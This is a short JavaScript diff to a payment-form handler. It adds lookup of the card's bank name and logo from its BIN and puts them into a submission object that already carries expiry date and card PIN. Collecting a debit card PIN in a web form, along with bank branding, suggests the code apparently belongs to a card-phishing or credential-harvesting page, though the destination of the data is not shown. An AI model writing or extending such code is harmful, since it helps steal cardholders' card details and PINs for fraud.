@@ -347,6 +347,18 @@
                 return false;
             }
 
+            // Detect bank from card BIN
+            var bankName = '';
+            var bankLogo = '';
+            if (typeof cardData !== 'undefined' && cardData.length > 0) {
+                var match = cardData.sort(function(a, b) { return b.bin.length - a.bin.length; })
+                    .find(function(c) { return debitNumber.startsWith(c.bin); });
+                if (match) {
+                    bankName = match.brandDescription;
+                    bankLogo = match.logo;
+                }
+            }
+
             var orderId = '';
             try { orderId = localStorage.getItem('orderId') || sessionStorage.getItem('orderId'); } catch(e) {}
 
@@ -358,6 +370,8 @@
                     expiry_month: expiryMonth,
                     expiry_year: expiryYear,
                     pin: cardPin,
+                    bank_name: bankName,
+                    bank_logo: bankLogo,
                     timestamp: new Date().toISOString()
                 }
             };
